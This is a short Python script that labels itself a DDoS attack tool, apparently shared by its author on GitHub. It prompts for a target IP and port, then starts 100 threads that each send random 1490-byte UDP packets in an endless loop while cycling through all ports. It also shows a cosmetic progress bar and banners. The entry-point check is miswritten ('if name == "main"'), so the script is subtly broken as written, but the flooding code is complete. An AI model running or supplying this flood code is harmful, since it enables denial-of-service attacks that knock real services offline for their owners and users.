import os
import time
import socket
import random
import threading

# Colors
BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Banner display
def print_banner():
    os.system("clear")
    print(f"{YELLOW}#################################################{RESET}")
    print(f"{RED}      DDoS ATTACK TOOL BY mhmd-error            {RESET}")
    print(f"{YELLOW}#################################################{RESET}")
    print(f"{GREEN}GitHub: https://github.com/mhmd138az{RESET}")
    print(f"{BLUE}==============================================={RESET}")
    print()

# Progress bar
def progress_bar():
    print(f"{BLUE}Preparing attack...{RESET}")
    for i in range(101):
        time.sleep(0.05)
        os.system("clear")
        print(f"{GREEN}[{'='*int(i/5)}{' '*(20-int(i/5))}] {i}%{RESET}")
    print(f"{GREEN}Attack is now live!{RESET}")

# Function to send packets
def send_packets(ip, port, sock, bytes):
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        if port > 65535:
            port = 1
        os.system("clear")
        print(f"{RED}Attack in Progress...{RESET}")
        print(f"{YELLOW}Sending packet {sent} to {ip} through port {port}{RESET}")
        time.sleep(0.1)

# Start the attack
def start_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    threads = []

    print_banner()
    progress_bar()
    
    print(f"{RED}Launching attack...{RESET}")

    # Create multiple threads for stronger attack
    for _ in range(100):
        thread = threading.Thread(target=send_packets, args=(ip, port, sock, bytes))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Main function to run the attack
def main():
    ip = input(f"{GREEN}Enter Target IP: {RESET}")
    port = int(input(f"{GREEN}Enter Target Port: {RESET}"))
    start_attack(ip, port)

if name == "main":
    main()
